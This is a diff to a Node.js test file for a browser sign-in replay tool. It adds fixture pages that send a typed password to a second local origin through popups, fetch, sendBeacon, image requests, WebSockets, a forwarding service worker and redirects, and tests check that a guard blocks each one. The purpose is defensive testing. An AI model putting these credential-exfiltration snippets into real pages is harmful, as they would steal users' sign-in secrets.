@@ -7,6 +7,7 @@
 const assert = require('node:assert/strict');
 const childProcess = require('node:child_process');
 const fs = require('node:fs');
+const http = require('node:http');
 const net = require('node:net');
 const os = require('node:os');
 const path = require('node:path');
@@ -48,9 +49,9 @@ const p03Text = (names) => `The run could not sign in to the app with the values
 // The app of the sign-in tests: a sign-in form at /sign-in that sends the reader to /orders
 // when the password is APP_SECRET, and shows the form again when it is not. /away redirects
 // to the form of another origin, the port OTHER_PORT, /link and /framed show a link to it and
-// a frame of it, /leak sends the password as a host name of that port at the submit, and
-// /alert shows the form with an alert at its load and at each key. The
-// other origin adds a line to the file OTHER_LOG for each request.
+// a frame of it, /popup posts the form to it in a new window, /leak sends the password as a
+// host name of that port at the submit, and /alert shows the form with an alert at its load
+// and at each key. The other origin adds a line to the file OTHER_LOG for each request.
 const APP = `
 const fs = require('fs');
 const http = require('http');
@@ -83,7 +84,9 @@ http.createServer((req, res) => {
   res.writeHead(200, { 'content-type': 'text/html' });
   if (req.url === '/link') res.end(page('<a id="go" href="' + other + '">Go</a>'));
   else if (req.url === '/framed') res.end(page('<iframe src="' + other + '"></iframe>'));
-  else if (req.url === '/leak') {
+  else if (req.url === '/popup') {
+    res.end(form(false).replace('action="/session"', 'action="' + other + '" target="_blank"'));
+  } else if (req.url === '/leak') {
     res.end(form(false).replace('</body>', '<script>document.forms[0].addEventListener(' +
       '"submit", (e) => { e.preventDefault(); location.href = "http://" + ' +
       'document.getElementById("password").value + ".localhost:' + process.env.OTHER_PORT +
@@ -559,6 +562,18 @@ test('preflight: a redirect, a link or a frame to another origin loads nothing t
     assert.equal(fs.readFileSync(otherLog, 'utf8'), '', words);
     assert.equal(await isFree(port), true, words);
   }
+});
+
+test('preflight: a sign-in that opens a new window of another origin writes the point of the page outside the app', { skip: NO_BROWSER }, async () => {
+  const { here, done, port, other, otherLog } = await signIn([{ do: 'open', url: '/popup' },
+    ...SIGN_IN.slice(1)], 'parcel-blue-41');
+  assert.equal(done.status, 1);
+  const origin = `http://127.0.0.1:${other}`;
+  assert.equal(done.findings[0].split('\n')[1], 'The sign-in of scenario-1 and scenario-2 ' +
+    `failed: the page opened ${origin}, outside the app, after the last action.`);
+  assert.deepEqual(points(here.root), [outsidePoint(`http://127.0.0.1:${port}/`, origin)]);
+  assert.equal(fs.readFileSync(otherLog, 'utf8'), '');
+  assert.equal(await isFree(port), true);
 });
 
 test('preflight: an outside origin that contains a typed value is another origin in the point and the finding', { skip: NO_BROWSER }, async () => {
@@ -1080,4 +1095,153 @@ test('preflight verb: each input that is missing or broken, and a runner with no
     ['preflight', '--inputs']]) {
     assert.equal(call(argv, deps).status, 2, argv.join(' '));
   }
+});
+
+// The pages of the guard tests, each with a sign-in form whose submit sends the password to
+// the origin other: a form or window.open in a new window, fetch, sendBeacon, an image, a
+// WebSocket, a service worker of the app that sends each form it gets there, a script that
+// opens an address there, or a form that posts there. /meta refreshes to other at its load,
+// /object shows a page of other in an object, and /blank-frame a field in a frame.
+function guardPages(other, otherHost) {
+  const page = (body) => `<!doctype html><html><body>${body}</body></html>`;
+  const form = (attrs) => `<form id="f" ${attrs}><input id="password" name="password">` +
+    '<button id="go" type="submit">Sign in</button></form>';
+  const send = (code) => form(`onsubmit="event.preventDefault();const v=password.value;${code};` +
+    'location.href=\'/orders\'"');
+  return {
+    '/popup-form': page(form(`method="post" action="${other}/popup-form" target="_blank"`)),
+    '/popup-open': page(form('onsubmit="event.preventDefault();' +
+      `window.open('${other}/popup-open?v='+password.value)"`)),
+    '/fetch': page(send(`fetch('${other}/fetch',{method:'POST',body:v,mode:'no-cors'})`)),
+    '/beacon': page(send(`navigator.sendBeacon('${other}/beacon',v)`)),
+    '/image': page(send(`new Image().src='${other}/img?v='+v`)),
+    '/socket': page(send(`new WebSocket('ws://${otherHost}/ws?v='+v)`)),
+    '/worker': page(`<p id="s">wait</p>${form('method="post" action="/session"')}` +
+      '<script>navigator.serviceWorker.register("/sw.js").then(() => ' +
+      'navigator.serviceWorker.ready).then(() => { if (navigator.serviceWorker.controller) ' +
+      'document.getElementById("s").textContent = "worker-ready"; else location.reload(); })' +
+      '</script>'),
+    '/sw.js': 'self.addEventListener("install", () => self.skipWaiting());\n' +
+      'self.addEventListener("activate", (e) => e.waitUntil(clients.claim()));\n' +
+      'self.addEventListener("fetch", (e) => { if (e.request.method !== "POST") return;\n' +
+      '  e.respondWith(e.request.clone().text().then((body) => fetch(' +
+      `"${other}/worker", { method: "POST", body, mode: "no-cors" }).catch(() => {}))\n` +
+      '    .then(() => new Response("<h1>Order 1042</h1>", ' +
+      '{ headers: { "content-type": "text/html" } }))); });\n',
+    '/script-nav': page(form('onsubmit="event.preventDefault();' +
+      `location.href='${other}/nav?v='+password.value"`)),
+    '/post': page(form(`method="post" action="${other}/post"`)),
+    '/meta': '<!doctype html><html><head><meta http-equiv="refresh" ' +
+      `content="0;url=${other}/meta"></head><body>${form('method="post" action="/session"')}</body></html>`,
+    '/object': page(`<object id="ob" data="${other}/object" type="text/html" width="400" ` +
+      `height="120"></object>${form('method="post" action="/session"')}`),
+    '/blank-frame': page('<iframe id="fr" src="about:blank"></iframe>' +
+      `${form('method="post" action="/session"')}<script>document.getElementById("fr")` +
+      '.contentDocument.body.innerHTML = "<input id=inner>";</script>'),
+    '/orders': page('<h1>Order 1042</h1>'),
+  };
+}
+
+// The result of the sign-in of each guard page: outside, a fail with the origin of the
+// other server; pass, a sign-in that passes, since the request fails and the app shows its
+// orders; or frame, a fail at a type into a frame. type is the target of the type action.
+const GUARD_CASES = {
+  'popup-form': { result: 'outside' }, 'popup-open': { result: 'outside' },
+  fetch: { result: 'pass' }, beacon: { result: 'pass' }, image: { result: 'pass' },
+  socket: { result: 'pass' }, worker: { result: 'pass' },
+  'script-nav': { result: 'outside' }, post: { result: 'outside' },
+  meta: { result: 'outside' }, object: { result: 'outside', type: '#ob' },
+  'blank-frame': { result: 'frame', type: '#fr' },
+};
+
+// listen starts an http server with handler on host, and resolves to it and its port.
+function listen(handler, host) {
+  return new Promise((resolve) => {
+    const server = http.createServer(handler);
+    server.listen(0, host, () => resolve({ server, port: server.address().port }));
+  });
+}
+
+// guard replays the sign-in of each of cases on the guard pages of an app on appHost, and
+// asserts that the server of another origin on 127.0.0.1 gets no request, that each new
+// window closes and writes its origin to outside, and that no page outside the tab remains.
+async function guard(appHost, cases) {
+  const { Browser } = require(path.join(SKILL, 'lib/browser.cjs'));
+  const got = [];
+  const other = await listen((req, res) => {
+    got.push(`${req.method} ${req.url}`);
+    res.end('other');
+  }, '127.0.0.1');
+  other.server.on('upgrade', (req, socket) => {
+    got.push(`UPGRADE ${req.url}`);
+    socket.destroy();
+  });
+  const otherOrigin = `http://127.0.0.1:${other.port}`;
+  const pages = guardPages(otherOrigin, `127.0.0.1:${other.port}`);
+  const app = await listen((req, res) => {
+    req.resume();
+    const at = req.url.split('?')[0];
+    if (req.method === 'POST') {
+      res.writeHead(303, { Location: '/orders' });
+      res.end();
+      return;
+    }
+    res.writeHead(200, { 'content-type': at.endsWith('.js') ? 'text/javascript'
+      : 'text/html' });
+    res.end(pages[at] || pages['/orders']);
+  }, appHost);
+  const base = `http://${appHost}:${app.port}/`;
+  const origin = new URL(base).origin;
+  const browser = new Browser(BROWSER, { origin });
+  try {
+    await browser.start();
+    for (const name of cases) {
+      got.length = 0;
+      const page = await browser.page({ origin });
+      const actions = [{ do: 'open', url: `/${name}` },
+        ...(name === 'worker' ? [{ do: 'wait', text: 'worker-ready', timeout_ms: 8000 }] : []),
+        { do: 'type', target: GUARD_CASES[name].type || '#password',
+          variable: 'DEMO_PASSWORD' },
+        ...(GUARD_CASES[name].type ? [] : [{ do: 'click', target: '#go' }])];
+      const done = await replay.signIn(page, actions,
+        { base, env: { DEMO_PASSWORD: 'parcel-blue-41' }, signedInMs: 2000 });
+      await new Promise((resolve) => { setTimeout(resolve, 1000); });
+      const { targetInfos } = await browser.send('Target.getTargets');
+      const left = targetInfos.filter((one) => one.browserContextId === page.browserContextId &&
+        one.type === 'page');
+      await page.close();
+      assert.deepEqual(got, [], name);
+      assert.deepEqual(left.map((one) => one.targetId), [page.targetId], name);
+      const { result } = GUARD_CASES[name];
+      if (result === 'outside') {
+        assert.equal(done.ok, false, name);
+        assert.equal(done.outside, otherOrigin, name);
+        assert.match(done.why, new RegExp(`the page opened ${otherOrigin}, outside the app`),
+          name);
+      } else if (result === 'frame') {
+        assert.deepEqual(done, { ok: false, outside: null,
+          why: 'action 2 (type into #fr) failed: the focus is in a frame' }, name);
+      } else {
+        assert.equal(done.ok, true, `${name}: ${done.why}`);
+      }
+    }
+  } finally {
+    await browser.stop();
+    app.server.close();
+    other.server.close();
+  }
+}
+
+test('preflight: no request of the sign-in reaches another origin, and a new window closes', { skip: NO_BROWSER }, async () => {
+  await guard('127.0.0.1', Object.keys(GUARD_CASES));
+});
+
+// The first IPv4 address of this machine that is not loopback, or null for none.
+const LAN = Object.values(os.networkInterfaces()).flat()
+  .find((one) => one && one.family === 'IPv4' && !one.internal);
+const NO_LAN = NO_BROWSER || (!LAN && 'this machine has no address other than loopback');
+
+test('preflight: the guard holds for an app whose host is not loopback', { skip: NO_LAN }, async () => {
+  // A service worker needs a secure origin, and http on such a host is none.
+  await guard(LAN.address, Object.keys(GUARD_CASES).filter((name) => name !== 'worker'));
 });
